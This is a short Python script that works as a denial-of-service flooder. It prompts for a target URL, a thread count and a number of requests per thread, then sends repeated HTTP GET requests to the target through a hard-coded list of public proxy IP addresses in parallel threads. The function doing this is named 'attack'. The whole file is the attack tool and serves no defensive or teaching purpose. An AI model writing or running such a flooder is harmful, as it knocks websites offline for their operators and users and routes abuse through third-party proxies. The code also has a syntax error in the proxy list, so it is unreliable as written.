import socket
import threading
import time

# Define a list of proxy tuples (host, port)
proxies = [
    ("34.81.160.132", 80),
    ("46.101.219.34", 80),
    ("41.74.91.244", 80),
    ("159.65.77.168", 8585),
    ("141.148.63.29", 80),
    ("89.117.32.209" 80),
    ("51.178.47.12", 80),
    ("146.83.205.10", 8085),
    ("173.212.195.139", 80),
    ("200.42.175.91", 80),
    # Add more proxy details as needed
]

# Website target
url = str(input('[+] Target (URL): '))

num_threads = int(input('[+] Thread: '))
num_requests = int(input('[+] Number of requests per thread: '))  # Number of requests per thread

def attack(proxy_host, proxy_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((proxy_host, proxy_port))
        
        # Modify the request to target the website URL
        request = f"GET {url} HTTP/1.1\r\nHost: {url}\r\n\r\n"
        
        for _ in range(num_requests):  # Send multiple requests
            s.send(request.encode())
        
        print(f'Attacking {url} via proxy {proxy_host} - Sent {num_requests} requests')
    
    except:
        print('Done')

def start():
    threads = []
    for _ in range(num_threads):
        for proxy_host, proxy_port in proxies:
            thread = threading.Thread(target=attack, args=(proxy_host, proxy_port))
            threads.append(thread)
            thread.start()
    
    for thread in threads:
        thread.join()

start()
